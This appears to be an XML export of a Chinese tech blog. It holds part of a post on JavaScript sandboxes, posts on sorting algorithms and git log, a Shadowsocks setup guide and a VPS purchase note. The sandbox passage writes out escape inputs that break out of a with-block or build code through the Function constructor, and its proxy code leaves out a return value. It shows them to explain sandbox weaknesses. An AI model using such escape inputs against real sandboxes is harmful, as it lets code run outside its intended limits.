&#123; return &#123; foo: true // 不允许访问对象的 foo，直接到上层 &#125; &#125;&#125;with(A.prototype) &#123; foo(); // 'global'&#125; 上面对 A 设置做了 Symbol.unscopables 的设定，声明 foo 属性在 A 上是不存在的，从而使得代码从 with 中逃逸。对此，我们需要对它做一层加固： 12345678910111213141516171819function compileCode(code) &#123; code = 'with (sandbox) &#123;' + code + '&#125;'; const fn = new Function('sandbox', code); return (sandbox) =&gt; &#123; const proxy = new Proxy(sandbox, &#123; has(target, key) &#123; return true; // 欺骗，告知属性存在 &#125; get(target, key, receiver) &#123; // 加固，防止逃逸 if (key === Symbol.unscopables) &#123; return undefined; &#125; Reflect.get(target, key, receiver); &#125; &#125;); return fn(proxy); &#125;&#125; 存在的漏洞不过，这里还存在两个逻辑漏洞： code 中可以提前关闭 sandbox 的 with 语境，如 &#39;} alert(this); {&#39;； code 中可以使用 eval 和 new Function 直接逃逸 对于第一个问题，我们可以通过堆栈深度检测： 123456789101112let stack = 0;for (let char of code) &#123; if (char === '&#123;') &#123; stack++; &#125; else if (char === '&#125;') &#123; if (stack === 0) &#123; throw new Error('Syntax Error.'); &#125; else &#123; stack--; &#125; &#125;&#125; 事实上，这样做依然不严谨，比如代码注释中出现花括号问题，如 /*{*/&#39;} alert(this); {&#39;/*}*/；而对于第二个问题，暂时还没有什么好的办法，尤其是 Function，它可以通过很多方式构造出来： 12(function()&#123;&#125;).constructor("alert(this)")();/2/.constructor.constructor("alert(this)")(); 最后灵活是 Javascript 这门语言的特性，也是它难以被掌控的主要原因，这点可以从文中各种沙箱逃逸方式就能看出。ES6 提供了很多新的特性，本文以沙箱为切入点，带着大家学习了几个函数和属性，希望读者有些收获。 本文没有得到一个完美的答案，但是这个问题依然值得思考和研究。 有一个比较不错的思路是，通过 iframe 执行代码，执行的结果通过 postMessage 函数通讯传输给操作者。并且 iframe 还提供了很多可供设置的安全参数，如 allow-scripts, allow-forms, allow-same-origin, allow-top-navigation 等等，方便我们对沙箱做安全控制。 更多阅读 Play safely in sandboxed IFrames Writing a JavaScript framework - Sandboxed code evaluation 题图：Sandbox for Addies Birthday]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
        <tag>沙箱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊一聊排序算法]]></title>
    <url>%2Fblog%2F2016%2F08%2F11%2F2016-08-11-algorithms-of-sort%2F</url>
    <content type="text"><![CDATA[两月前花了些时间，将大学里学过的排序算法都复习了一遍，代码放在 github 上，没有整理。今天翻了翻代码，重新 review 了一遍，也顺便做了点记录。 下面花了不少篇幅，将基础排序、希尔、归并、快排、堆排序等都介绍了一通，懒得思考的同学可以略过代码直接看文字，文章对排序的基本思路都做了介绍。 三种基本排序插入排序和选择排序是两种最基本的排序算法，思路完全不一样，但是细思一番，还是挺有意思的： insertion sort，插入排序，思路简单来说就是把自己插入到已排好序的列表中去，交换也是颇为频繁的。 12345678910function insertion(input) &#123; for(var i = 1, len = input.length; i &lt; len; i++) &#123; for(var j = i; j &gt; 0; j--) &#123; if(input[j] &lt; input[j - 1]) &#123; input[j] = [input[j - 1], input[j - 1] = input[j]][0]; &#125; &#125; &#125; return input;&#125; selection sort，选择排序，选择排序只对最后一个被选中的元素排序。它会往后找到包括自己在内最小的一个元素，替换自己。简单来说就是把第 i 小的元素放到第 i 个序位上。 123456789101112function selection(input) &#123; for(var i = 0, len = input.length; i &lt; len - 1; i++) &#123; var min = i; for(var j = i + 1; j &lt; len; j++) &#123; if(input[j] &lt; input[min]) &#123; min = j; &#125; &#125; input[i] = [input[min], input[min] = input[i]][0]; &#125; return input;&#125; 而冒泡排序，就更简单了，从第一个元素开始，往后比较，遇到比自己小的元素就交换位置，交换的次数最多，自然也是性能最差的。 12345678910function bubble(input) &#123; for(var i = 0, len = input.length; i &lt; len - 1; i++) &#123; for(var j = i + 1; j &lt; len; j++) &#123; if(input[j] &lt; input[i]) &#123; input[j] = [input[i], input[i] = input[j]][0]; &#125; &#125; &#125; return input;&#125; 针对随机性排列不同（比如完全随机，顺序，倒序，半顺序等状态）的数据，三种效果也是不一样的，可以思考下。 希尔排序上面提到了三种最基本的排序算法，这里要提到的希尔排序，有点不好理解。 代码：/chapters/chapter-2-sorting/2.1-elementary-sorts/shell.js 123456789101112131415161718function shell(input) &#123; var h = 1; var len = input.length; while(h &lt; Math.floor(len / 3)) &#123; h = h * 3 + 1; &#125; while(h &gt;= 1) &#123; for(var i = h; i &lt; len; i++) &#123; for(var j = i; j &gt;= h; j -= h) &#123; if(input[j] &lt; input[j - h]) &#123; input[j] = [input[j - h], input[j - h] = input[j]][0]; &#125; &#125; &#125; h = Math.floor(h / 3); &#125; return input;&#125; 算法复杂不代表需要很多的代码去实现，因为代码表达的是过程，通过循环等方式可以很迅速实现一个过程，而算法是处理问题的方法，把它表达清楚可能就得费不少唇舌，甚至还得配上一些图辅助阅读。 希尔排序，大概的思路就是不断地从整体上调整数据的顺序，将比较大的数据尽量往后挪，比较小的数据尽量往前挪。数据的搬移也不是一步完成，每一次搬移都会将数据分块，分块的目的是尽可能的搬移距离比较远的数据，从而减少比较操作和交换操作。 归并排序基本排序和希尔排序是都是从头到尾去遍历数据，不可避免的带来很多交换操作。归并排序是一种用空间换时间的排序算法，一个数组截断成两个子数组，子数据排好序后合并到一起。 代码：/chapters/chapter-2-sorting/2.2-mergesort/merge.js 1234567891011121314151617181920function merge(input1, input2) &#123; var i = 0, j = 0; var output = []; while(i &lt; input1.length || j &lt; input2.length) &#123; if(i == input1.length) &#123; output.push(input2[j++]); continue; &#125; if(j == input2.length) &#123; output.push(input1[i++]); continue; &#125; if(input1[i] &lt; input2[j]) &#123; output.push(input1[i++]); &#125; else &#123; output.push(input2[j++]); &#125; &#125; return output;&#125; 上面是一个简单的合并算法，将两个有序数据合并为一个。有人应该会想到，既然一个数组可以打散成两个进行排序，那被打算的子数组是不是也可以继续被打散呢？ 答案是肯定的。这是一种典型的分治思想，递归归并。 代码：/chapters/chapter-2-sorting/2.2-mergesort/mergeRecursiveTop2Bottom.js 12345678910111213141516171819202122232425262728293031323334353637function mergeRecursiveTop2Bottom(input) &#123; return sort(input, 0, input.length - 1); function sort(arr, start, end) &#123; if(start &gt;= end) &#123; return; &#125; var mid = ((end - start) &gt;&gt; 1) + start; sort(arr, start, mid); sort(arr, mid + 1, end); return merge(arr, start, mid, end); &#125; function merge(arr, start, mid, end) &#123; var i = start, j = mid + 1, tmp = []; for(var k = start; k &lt;= end; k++) &#123; tmp[k] = arr[k]; &#125; for(k = start; k &lt;= end; k++) &#123; if(i &gt; mid) &#123; arr[k] = tmp[j++]; continue; &#125; if(j &gt; end) &#123; arr[k] = tmp[i++]; continue; &#125; if(tmp[i] &lt; tmp[j]) &#123; arr[k] = tmp[i++]; &#125; else &#123; arr[k] = tmp[j++]; &#125; &#125; return arr; &#125;&#125; 上面的算法是自顶向下的递归归并，简单来说就是解决很多小问题，那么大问题也就自然而然的解决了；还有一种自底向上的归并，这种归并简单来说，就是把一个大问题分解为多个小问题，多个小问题的答案就能得出大问题的答案。从解决问题的方式来看，两种处理方式是互逆的。 代码：/chapters/chapter-2-sorting/2.2-mergesort/mergeRecursiveTop2Bottom.js 123456789function sort(arr) &#123; for(var sz = 1, len = arr.length; sz &lt; len; sz = sz * 2) &#123; for(var start = 0; start &lt; len - sz; start += sz * 2) &#123; arr = merge(arr, start, start + sz - 1, Math.min(start + sz * 2 - 1, len - 1)); &#125; &#125; return arr;&#125;// merge 函数同上 不过自底向上的归并，在代码上稍微难理解一些，脑海重要有清晰的画卷，知道程序跑到哪一步了，尤其还需要处理边界问题。 快排上面讨论了归并排序，将一个数组拆分成两个，然后合并处理，进而有了递归归并的思考。 而本节提出了一种更加高效的排序方法，这种算法跟归并排序是互补的，归并排序大致思路是分-排序合，而本节提出的快排采用的思路是排序分-合，把排序这种损耗比较大的操作前置了，所以效率更高。 代码：/chapters/chapter-2-sorting/2.3-quicksort/quicksort.js 12345678910111213141516171819202122232425function quicksort(input) &#123; sort(0, input.length - 1); return input; function sort(start, end) &#123; if(start &gt;= end) &#123; return; &#125; var mid = partition(start, end); sort(start, mid - 1); sort(mid + 1, end); &#125; function partition(start, end) &#123; var i = start, j = end + 1, k = input[start]; while(true) &#123; while(input[++i] &lt; k) if( i === end) break; while(input[--j] &gt; k) if( j === start) break; if(i &gt;= j) break; input[i] = [input[j], input[j] = input[i]][0]; &#125; input[j] = [input[start], input[start] = input[j]][0]; return j; &#125;&#125; 这个算法写起来，感觉相当酸爽，因为这个排序思路太棒，情不自禁地热血沸腾。事实上，这个算法也是存在几个疑点的： 代码中的 mid 这个「哨兵」为啥要取第一个呢？ partition 函数当 end - start 很小的时候效率还高么？ 于是有了两个想法： 使用 input 的中位数作为「哨兵」 当 end - start 比较小的时候，大约为 5~15，改为其他比较高效的算法 今天只对第二个想法做了实践，基本改造如下： 代码：chapters/chapter-2-sorting/2.3-quicksort/quicksortImprove.js 1234567891011121314151617var delta = 5;function quicksortImprove(input) &#123; sort(0, input.length - 1); return input; // sort 和 partition 函数同上 function insertion(start, end) &#123; for(var i = start + 1, len = end - start; i &lt; end; i++) &#123; for(var j = i; j &gt; start; j--) &#123; if(input[j] &lt; input[j - 1]) &#123; input[j] = [input[j - 1], input[j - 1] = input[j]][0]; &#125; &#125; &#125; &#125;&#125; 优化后的快排上面提到了快排和快排的改进算法。当待排序的数据中存在大量重复元素时，快排的效率会不太高，当遇到重复元素的时候，比较和交换都是赘余的，重复元素越多，性能越差，为了解决这个问题，我们引入了第三个变量，来标识重复元素区间，如下图所示： 12345+---------------------------------+| &lt;v | =v |=========| &gt; v |+---------------------------------+ ↑ ↑ ↑ lt i gt 大致的原理是：每次排序分组的时候，就会过滤掉重复元素，这样，进入递归的元素就少了很多，因此而提高效率。 代码：/chapters/chapter-2-sorting/2.3-quicksort/quick3way.js 1234567891011121314151617181920212223function quick3way(input) &#123; sort(0, input.length - 1); return input; function sort(start, end) &#123; if(start &gt;= end) return; var lt = start, gt = end, i = start + 1, v = input[start]; while(i &lt;= gt) &#123; if(input[i] &lt; v) &#123; input[lt] = [input[i], input[i] = input[lt]][0]; lt++; i++; &#125; else if(input[i] &gt; v) &#123; input[gt] = [input[i], input[i] = input[gt]][0]; gt--; &#125; else &#123; i++; &#125; &#125; sort(start, lt - 1); sort(gt + 1, end); &#125;&#125; 优先队列，堆排序从最开始基本的冒泡、插入、选择和希尔排序，到分治思想的延伸——归并排序（自顶向下和自底向上），再到归并排序的互补算法——快排，然后学习了新的数据结构——二叉堆，于是有了堆排序。 二叉堆是一种数据结构，他的每一个二叉树点元素数值都会比下面两个节点元素的数值要大，因为这种数据接口包含的信息量很大，而得到这种数据结构的成本是很低的，构建一个二叉堆的算法并不复杂： 代码：/chapters/chapter-2-sorting/2.4-priority-queues/priorityQueueAdd.js 123456789101112131415161718192021function priorityQueueAdd(input) &#123; var output = []; output[1] = input[0]; for(var i = 1, len = input.length; i &lt; len; i++) &#123; output = swim(output, input[i]); &#125; return output; function swim(arr, val) &#123; arr.push(val); var k = arr.length - 1; while(k &gt; 1 &amp;&amp; arr[k &gt;&gt; 1] &lt; arr[k]) &#123; var p = k &gt;&gt; 1; arr[p] = [arr[k], arr[k] = arr[p]][0]; k = p; &#125; return arr; &#125;&#125; 通过上浮的方式，不断插入新元素，既可形成一个二叉堆。这种优先队列最大的特点是，能够拿到很快拿到最大元素（顶部），当这个最大元素被删除（优先级最高的事务被处理完成）时，还能快速高效地将剩下的元素重整为一个二叉堆： 代码：/chapters/chapter-2-sorting/2.4-priority-queues/priorityQueueDelete.js 123456789101112131415161718192021function priorityQueueDelete(input) &#123; var output = []; input.splice(1, 1); output = sink(input); return output; function sink(arr) &#123; arr.splice(1, 0, arr.pop()); var k = 1, N = arr.length - 1; while(2 * k &lt;= N) &#123; var j = 2 * k; if(j &lt; N &amp;&amp; arr[j] &lt; arr[j + 1]) j++; if(arr[k] &gt;= arr[j]) break; arr[k] = [arr[j], arr[j] = arr[k]][0]; k = j; &#125; return arr; &#125;&#125; 一个二叉堆能够快速拿到最大元素，并且能够立即重新调整为二叉堆，基于这个特性，就有了堆排序： 代码：/chapters/chapter-2-sorting/2.4-priority-queues/heapSort.js 1234567891011121314151617181920212223242526function heapSort(input) &#123; return sort(input); function sort (arr)&#123; var N = arr.length - 1; for(var k = N &gt;&gt; 2; k &gt;= 1; k--) &#123; arr = sink(arr, k, N); &#125; while(N &gt; 1) &#123; arr[1] = [arr[N], arr[N] = arr[1]][0]; N--; arr = sink(arr, 1, N); &#125; return arr; &#125; function sink(arr, k, N) &#123; while(2 * k &lt;= N) &#123; var j = 2 * k; if(j &lt; N &amp;&amp; arr[j] &lt; arr[j + 1]) j++; if(arr[k] &gt;= arr[j]) break; arr[k] = [arr[j], arr[j] = arr[k]][0]; k = j; &#125; return arr; &#125;&#125; 光看代码还是挺难理解的，脑海中必须有一个数组储存的堆模型。for 循环构造了堆（从 N/2 开始，跳过了所有大小为 1 的堆），注意，这里构造的并不是二叉堆，然后 while 循环将最大的元素 a[1] 和 a[n] 交换位置并修复堆，如此循环直到堆为空。 上面的排序用到的是 sink 方法，而 swim 方法也是可以用于排序算法之中的，这就是对应的下沉排序，感觉有点难理解。 小结能够从上往下看到这里的，需要给你点个赞。算法的学习刚开始有点枯燥，也有点艰难，学着学着，慢慢的就能够领悟其中的趣味。 后续我也会投入一部分精力深入研究算法，希望可以通过一定量的算法实践大幅度提升自己的思维能力和动手能力。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有意思的 git-log]]></title>
    <url>%2Fblog%2F2016%2F08%2F04%2F2016-08-04-funning-gitlog%2F</url>
    <content type="text"><![CDATA[之前写过几篇 git 相关的文章，内容很基础， git版本回退操作 git切换到远程分支 git版本管理策略及相关技巧(A) 但发现最近被搜索引擎检索的量还比较大，最近正好在阅读 git 相关的资料，准备将不错的几个点，详细地说一说，记录下来写出来分享给大家。今天要说的便是常用的 git log 命令。 先看几个栗子以 React-Native 代码为例，演示几个有意思的 git-log 命令。 普通查看：git log 1234567891011121314151617commit f84120a1669cd3a6c8db5e830a96565fa07d3ba8Author: Justin McPherson &lt;justin.mcpherson@canonical.com&gt;Date: Thu Aug 4 18:09:50 2016 +1000 Update README - Correct URL of git repo. - Mention supported Ubuntu variants.commit cf3ade3eff98baf710d9f4134aa9ddde2ad96920Merge: 25a5a12 d47218eAuthor: Justin McPherson &lt;justin.mcpherson@canonical.com&gt;Date: Thu Aug 4 17:57:25 2016 +1000 Merge pull request #1 from RodrigoHahn/patch-1 Rename README.ubuntu to README-ubuntu.md 简略形式：git log --oneline 1234567891011121314f84120a Update READMEcf3ade3 Merge pull request #1 from RodrigoHahn/patch-1d47218e Rename README.ubuntu to README-ubuntu.md25a5a12 react: Don&apos;t throw exceptions on error4ced394 Cleanupc1bd457 Improve Image support7d0fa11 Improve timer handling88b7cef Move tmp directory into the ubuntu rootf240917 Update for READMEe19c816 Refinements+fixes to running and packaging.8302160 Don&apos;t specify current directory for generic node executable.135ecc5 Executor and Packaging update.dafb051 Copy assets to phone on rune6aec7a Fix packaging step for assets 查看详细修改：git log -p -2，只看最近两条 123456789101112131415161718192021222324commit f84120a1669cd3a6c8db5e830a96565fa07d3ba8Author: Justin McPherson &lt;justin.mcpherson@canonical.com&gt;Date: Thu Aug 4 18:09:50 2016 +1000 Update READMEdiff --git a/README-ubuntu.md b/README-ubuntu.mdindex ad3574f..0a732f8 100644--- a/README-ubuntu.md+++ b/README-ubuntu.md@@ -3,6 +3,10 @@+### Platforms++There is support for applications on both Desktop Ubuntu and Ubuntu Touch.+ You should have an Ubuntu 16.04 (Xenial Xerus) installation.@@ -32,7 +36,7 @@ ubuntu need to be published to a local package repository. Download the port for Ubuntu. ~$ mkdir src; cd src-~/src$ git clone https://git.launchpad.net/reactnative-ubuntu -b ubuntu+~/src$ git clone https://github.com/CanonicalLtd/react-native -b ubuntu And then follow the instruction in ~/src/reactnative-ubuntu/react-native-cli/README.md 展示文件修改的量：git log --shortstat 12345678910111213141516commit cf3ade3eff98baf710d9f4134aa9ddde2ad96920Merge: 25a5a12 d47218eAuthor: Justin McPherson &lt;justin.mcpherson@canonical.com&gt;Date: Thu Aug 4 17:57:25 2016 +1000 Merge pull request #1 from RodrigoHahn/patch-1 1 files changed, 22 insertions(+), 12 deletions(-)commit d47218e08cffb1479c1e3511031ae377023b01c2Author: RodrigoHahn &lt;rodrigo.rmh@gmail.com&gt;Date: Wed Aug 3 10:16:59 2016 -0300 Rename README.ubuntu to README-ubuntu.md 2 files changed, 226 insertions(+), 226 deletions(-) 简略展示，加分支情况：git log --pretty=format:&quot;%h %s&quot; --graph 1234567891011121314151617* b36abb0 Initial support for ImageLoader* 9cf8f2a Merge branch &apos;master&apos; of https://github.com/facebook/react-native into ubuntu|\| * d363b1f Update Jest APIs on fbsource| * 192ab66 Fix 302 ImageLoader caching problem on iOS| * 6a26037 Fix build break of react native exopackage apps| * 50d8d46 Add ability to expose sync hooks from Java to JS| * 171c723 Simplify message passing in JSC-executor| * fb76154 handle null args array in proxy invocation handler| * 131970d Android Support Repository -&gt; Local Maven repository for Support Libr…* | 3cf6e03 Update measure function to match master* | 2fb11b3 Merge branch &apos;master&apos; into ubuntu|\ \| |/| * 8295d27 Fix usage of react-native cli inside package.json scripts| * b5d9bf0 merge InteractionManager stuff back into PanResponder| * dad39eb Move `Number` polyfills into the `/polyfills/` directory 查看单个文件被修改的情况：git log -p React/Base/RCTAssert.m 12345678910111213141516171819commit 34d5fa2695971ba9c9b2271578ade4b700061066Author: Nick Lockwood &lt;nicklockwood@fb.com&gt;Date: Thu Jan 21 07:49:45 2016 -0800 RCTUtils Obj-C nullability annotationsdiff --git a/React/Base/RCTAssert.m b/React/Base/RCTAssert.mindex 4742cb3..d0006e2 100644--- a/React/Base/RCTAssert.m+++ b/React/Base/RCTAssert.m@@ -119,7 +119,7 @@ void _RCTAssertFormat( void RCTFatal(NSError *error) &#123;- _RCTLogNativeInternal(RCTLogLevelFatal, NULL, 0, @&quot;%@&quot;, [error localizedDescription]);+ _RCTLogNativeInternal(RCTLogLevelFatal, NULL, 0, @&quot;%@&quot;, error.localizedDescription); RCTFatalHandler fatalHandler = RCTGetFatalHandler(); if (fatalHandler) &#123; 查看 Brent Vatne 修改过的 md 文件：git log --author=&#39;Brent Vatne&#39; \*.md 1234567891011commit 2ed199fa2bd7b68546a0c688437657653e7dad03Author: Brent Vatne &lt;brentvatne@gmail.com&gt;Date: Tue Jan 12 12:02:48 2016 -0800 Update KnownIssues.mdcommit 33d6293c607340836372201b0e7b26d7bddba0c8Author: Brent Vatne &lt;brentvatne@gmail.com&gt;Date: Mon Dec 28 17:51:30 2015 -0800 Update KnownIssues.md 查看 James Ide 在 2016 年 2 月内的所有动态：git log --author=&#39;James Ide&#39; --since=&#39;2016-02-01&#39; --before=&#39;2016-03-01&#39; 123456789101112commit b051d07b819be7ff01ac54106ca7f0f0289d1bd0Author: James Ide &lt;ide+github@jameside.com&gt;Date: Wed Feb 10 12:46:26 2016 -0800 Update CONTRIBUTING.mdcommit 0e0f20c80683723a4f279910bd9d5a4c088fe039Merge: 82b0df9 e59efc1Author: James Ide &lt;ide+github@jameside.com&gt;Date: Wed Feb 3 17:27:44 2016 -0800 Merge pull request #5744 from LoadDOCs/loaddocs 查看包含 ‘Fix bug’ 的日志，一行展示：git log --grep=&#39;Fix bug&#39; --oneline 123456d637621 Fix bug #5604 - Unrecognised signal for touchable no longer on the screen5f4390b Fix bug related to removeClippedSubviews and view collapsing.041fb59 Fix bug with calculating Y offset in RecyclerViewBackedScrollView.64a78ed Fix bug in Android elevation implementation3a92f20 Fix buggy behavior of setBackgroundColor in react View.f4c7bb1 [react-packager] Fix bug on Bundles Layout algorithm 查看某次修改的内容：git show 3a92f20 1234567891011121314commit 3a92f2017fc2e51c2a915f0e535397cb3937d412Author: Krzysztof Magiera &lt;krzysztof@fb.com&gt;Date: Mon Oct 26 14:21:12 2015 -0700 Fix buggy behavior of setBackgroundColor in react View.diff --git a/ReactAndroid/src/main/java/com/facebook/react/views/view/ReactViewGroup.java b/ReactAndroid/src/main/java/com/facebook/react/views/view/ReactViewGroup.javaindex b583eeb..6131f00 100644--- a/ReactAndroid/src/main/java/com/facebook/react/views/view/ReactViewGroup.java+++ b/ReactAndroid/src/main/java/com/facebook/react/views/view/ReactViewGroup.java@@ -118,18 +118,8 @@ public class ReactViewGroup extends ViewGroup implements- Drawable backgroundDrawble = getBackground();- if (mReactBackgroundDrawable != null &amp;&amp; (backgroundDrawble instanceof LayerDrawable)) &#123;- // extract translucent background portion from layerdrawable 理解 git loggit log 详细记录了所有开发者在项目中的贡献情况，包括作者的信息、提交的内容（与上一次的差异对比 patch），还添加了一些额外的诸如时间、id（commit sha1）等内容。 它就像是一个数据库，提供了很多很多参数可以被重新梳理、查询。 效果 SQL git 命令 查询前两条 SELECT * FROM git-log LIMIT 0,2 git log -p -2 查询5-8条 SELECT * FROM git-log LIMIT 5,3 git log -p --skip=5 -3 关键词查询 SELECT commitMsg FROM git-log WHERE commitMsg LIKE &#39;%Fix bug%&#39; git log --oneline --grep=&#39;Fix bug&#39; 个人日志 SELECT * FROM git-log WHERE DATE(ct) BETWEEN &#39;2016-02-01&#39; AND &#39;2016-03-01 AND author=’James Ide’ git log --author=&#39;James Ide&#39; --since=&#39;2016-02-01&#39; --before=&#39;2016-03-01&#39; git-log 提供的命令相当多，可以通过 git help log 查看，基本上可以满足我们日常查询需求。 最后列一条十分给力的查看 git-log 全貌命令，可以通过 alias 写到 .bashrc/.zshrc 中： 1alias gitlog=&quot;git log --all --graph --pretty=format:&apos;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&apos; --abbrev-commit --date=relative&quot; 效果图（点击可放大）： 本文完。]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shadowsocks 原理简介及安装指南]]></title>
    <url>%2Fblog%2F2016%2F08%2F03%2F2016-08-03-shadowsocks%2F</url>
    <content type="text"><![CDATA[对 Shadowsocks 早有耳闻，当时我还在用 HTTP 代理、VPN 服务等翻墙，感觉它是个比较高大上的东西，也一直没有碰它。最近 GreenVPN 抽风，Mac 一直连接不上，害得我折腾了很久，最后还是买了一台国外的 VPS，于是开始折腾起 Shadowsocks，部署之前，对它做了一个简单的了解，下面先介绍下。 一道隐形的墙众所周知，天朝局域网通过 GFW 隔离了我们与外界的交流，当然，这个隔离并非完全隔离，而是选择性的，天朝不希望你上的网站就直接阻断。每一个网络请求都是有数据特征的，不同的协议具备不同的特征，比如 HTTP/HTTPS 这类请求，会很明确地告诉 GFW 它们要请求哪个域名；再比如 TCP 请求，它只会告诉 GFW 它们要请求哪个 IP。 GFW 封锁包含多种方式，最容易操作也是最基础的方式便是域名黑白名单，在黑名单内的域名不让通过，IP 黑白名单也是这个道理。如果你有一台国外服务器不在 GFW 的黑名单内，天朝局域网的机器就可以跟这一台机器通讯。那么一个翻墙的方案就出来了：境内设备与境外机器通讯，境内想看什么网页，就告诉境外的机器，让境外机器代理抓取，然后送回来，我们要做的就是保证境内设备与境外设备通讯时不被 GFW 怀疑和窃听。 ssh tunnel 是比较具有代表性的防窃听通讯隧道，通过 ssh 与境外服务器建立一条加密通道，此时的通讯 GFW 会将其视作普通的连接。由于大家都这么玩，GFW 着急了，于是它通过各种流量特征分析，渐渐的能够识别哪些连接是 ssh 隧道，并尝试性的对隧道做干扰，结果还是玩不过 GFW，众多隧道纷纷不通。 Shadowsocks 及其部署如果你理解了上面那道隐形的墙的原理，那 Shadowsocks 的原理就可以用一句简单的描述来理解了：它发出的 TCP 包，没有明显包特征，GFW 分析不出来，当作普通流量放过了。 1. 基本原理 具体而言，Shadowsocks 将原来 ssh 创建的 Socks5 协议拆开成 Server 端和 Client 端，两个端分别安装在境外服务器和境内设备上。 123+------+ +------+ +=====+ +------+ +-------+| 设备 | &lt;-&gt; |Client| &lt;-&gt; | GFW | &lt;-&gt; |Server| &lt;-&gt; | 服务器 |+------+ +------+ +=====+ +------+ +-------+ Client 和 Server 之间可以通过多种方式加密，并要求提供密码确保链路的安全性。 2. 服务器端部署 Shadowsocks 封装后对用户而言就是一个程序指令，以 Ubuntu 为例，首先安装 pip， 12apt-get install python-pippip install shadowsocks 注意 pip 的安装现在要求 python 版本大于等于 2.6，然后通过 pip 安装 shadowsocks。启动 shadowsocks 有两种方式，一种是通过一行命令直接启动： 1ssserver -p PORT -k PASSWORD -m rc4-md5 --log-file /tmp/ss.log -d start 另一种是使用 config 文件启动，如先配置好文件（/etc/shadowsocks.json）： 123456789&#123; "server": "YOUR_SERVER_IP", "server_port": 8388, "local_address": "127.0.0.1", "local_port": 1080, "password": "PASSWORD", "timeout": 300, "method":"aes-256-cfb", &#125; 然后通过 ssserver 启动： 1ssserver -c /etc/shadowsocks.json -d start 更加具体的配置说明，请戳 这里 和 这里。 3. 客户端配置 Mac 客户端的下载地址： Github 墙内地址，下方右侧 配置位置： 配置方式： 相关说明：Shadowsocks for OSX 帮助 iPhone 设备可以选择 shadowrocket 客户端，需要 6 元购买，它的好处是，能够持续保持连接，休眠状态也不会断开，并且内置了规则，一些需要翻墙的域名才会自动翻墙。 小结刚开始在配置 ss-serser 的时候，我遇到了些问题，本地死活代理不成功，后来通过下面这种方式调试了下： 1.客户端通过 telnet ip port 确认 ss-server 是否正常开启 如果没有正常开启，有可能是设定的端口没有开放， 1iptables -A INPUT -p tcp --dport 8388 -j ACCEPT 执行上述命令，将 8388 修改为你设定的端口即可。 2.如果第一步中连接正常，可以查看下 ss-server 的日志 1ssserver -c /etc/shadowsocks.json --log-file /tmp/ss.log -d start 启动的时候添加 --log-file 参数，然后通过 tail -f /tmp/ss.log 查看实时日志，一般可以看出一点端倪。 本文的普及就到这里了，希望对你有些帮助。]]></content>
      <categories>
        <category>工具</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>Shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[入 linode 之前]]></title>
    <url>%2Fblog%2F2016%2F08%2F02%2F2016-08-02-before-purchase-linode%2F</url>
    <content type="text"><![CDATA[之前购买的 GreenVPN 最近死活越不了墙，在阿里云上尝试用 wget 下载资源，貌似能够连接上。于是尝试在阿里云上配置 shadowsocks，配置时提示需要使用 pip，而使用 pip 就得升级 Python(≥2.6)，折腾了一番，升级了 Python 也安装了 pip，最后却发现下载速度奇慢。 不得已打算入一台国外服务器，配置 shadowsocks 以后翻墙也能稳定很多。挑了半天哪个更靠谱，最后选择 linode，注册时要求使用 visa 或者 MasterCard，并扣费 20 刀（支付宝，要争气呀！）。之前招行申请的一张 MasterCard 貌似因为没激活过期了😂，手里还有一张从来没用过的中行长城国际卓隽 visa 卡，便顺利成章地用了。 注册成功后，很快地，一封来自 linode 消费账单发到我邮箱。顷刻间想起，上次给一张外境卡转美金，购汇、转汇花了我两张毛爷爷作为手续费，如果这张卡还款又要辣么多手续费就亏大了。于是摸索这张 visa 卡如何还美金，在 BOC 寻觅了半天没找到答案，最后还是电话给客服 MM（24 小时服务，这点中行做的不错，招行他喵的下午六点就没人了），了解到这卡着实不错，跨币种使用，免手续费，到时候还等额的人民币就行了，或者直接充值一定量人民币到卡里头，让它自生自灭也行。摸索过程中还发现这卡能国外取现，美金 2500 刀，感觉挺棒！ 好吧，折腾到半宿，linode 到手，剩下的工作就是在服务器配置 shadowsocks 了…-_-|| 如果你也想搞一台 linode 服务器，可以使用我这个邀请码 ( https://www.linode.com/?r=69a0ed6f8e2c517588995a35654384774d49bc07 )，你我都会得到一些优惠。你的优惠就是免费使用 linode 90 天，也不用像我这么折腾，刚开始还得折腾美刀的事情。 写到这里，我突然记起屈屈也在自己博客上发过一个邀请码…嗯，亏了。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>linode</tag>
        <tag>信用卡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工作五年，后面四年重复着第一年的活儿？]]></title>
    <url>%2Fblog%2F2016%2F07%2F21%2F2016-07-21-donnot-repeat-yourself%2F</url>
